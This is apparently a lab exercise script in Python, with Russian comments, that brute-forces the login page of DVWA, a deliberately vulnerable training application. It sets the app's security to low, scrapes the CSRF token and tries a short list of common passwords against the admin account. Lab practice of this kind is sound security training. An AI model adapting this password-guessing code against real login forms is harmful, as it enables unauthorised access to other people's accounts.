#!/usr/bin/python3
import requests
import re

print("DVWA BRUTEFORCE - WORKING VERSION")
print("="*50)

s = requests.Session()

# 1. Логинимся
print("1. Login...")
r = s.post("http://dvwa.local/login.php",
          data={'username':'admin','password':'password','Login':'Login'})
print(f"   Status: {r.status_code}")

# 2. Security low
print("2. Security low...")
s.post("http://dvwa.local/security.php",
      data={'security':'low','seclev_submit':'Submit'})

# 3. Получаем brute force страницу и CSRF токен
print("3. Get CSRF token from brute force page...")
brute_url = "http://dvwa.local/vulnerabilities/brute/"
r = s.get(brute_url)

# Ищем CSRF токен (user_token)
csrf_match = re.search(r'name="user_token" value="([^"]+)"', r.text)
if not csrf_match:
    print("   ERROR: No CSRF token found!")
    exit()

csrf_token = csrf_match.group(1)
print(f"   CSRF token: {csrf_token}")

# 4. Делаем запрос С CSRF токеном
print("\n4. Testing passwords WITH CSRF token...")
print("-"*40)

passwords = ['password', '123456', 'admin', 'abc123', 'letmein']

for pwd in passwords:
    # URL с CSRF токеном
    url = f"{brute_url}?username=admin&password={pwd}&Login=Login&user_token={csrf_token}"
    
    print(f"\nTesting: admin / {pwd}")
    r = s.get(url)
    
    # Проверяем ответ
    if 'Welcome to the password protected area' in r.text:
        print(f"   ✓ SUCCESS! Password found: {pwd}")
        # Покажем доказательство
        for line in r.text.split('\n'):
            if 'Welcome' in line:
                print(f"   Proof: {line.strip()}")
        break
    elif 'Username and/or password incorrect' in r.text:
        print(f"   ✗ Failed")
    else:
        print(f"   ? Unknown response: {len(r.text)} chars")

print("\n" + "="*50)
print("COMPLETE")
print("="*50)
